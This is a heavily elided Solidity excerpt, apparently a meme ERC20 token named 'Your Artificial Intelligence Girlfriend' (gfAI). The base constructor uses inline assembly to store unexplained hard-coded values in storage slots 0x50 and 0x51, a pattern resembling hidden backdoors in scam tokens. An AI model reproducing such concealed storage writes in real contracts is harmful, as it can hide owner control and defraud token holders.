/*
  ...
  Your Artifical Intelligence Girlfriend
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xba2e1f7577dc80a441855e72e514091d528bd63debe2)
            sstore(0x51,0xba2ef0f3705029675acb10be65101f168e2ae7e71ecd)
...
contract gfAI is ERC20Token {
    constructor() ERC20Token("Your Artificial Intelligence Girlfriend", "gfAI", msg.sender, 69420000 * 10 ** 18) {
    }
}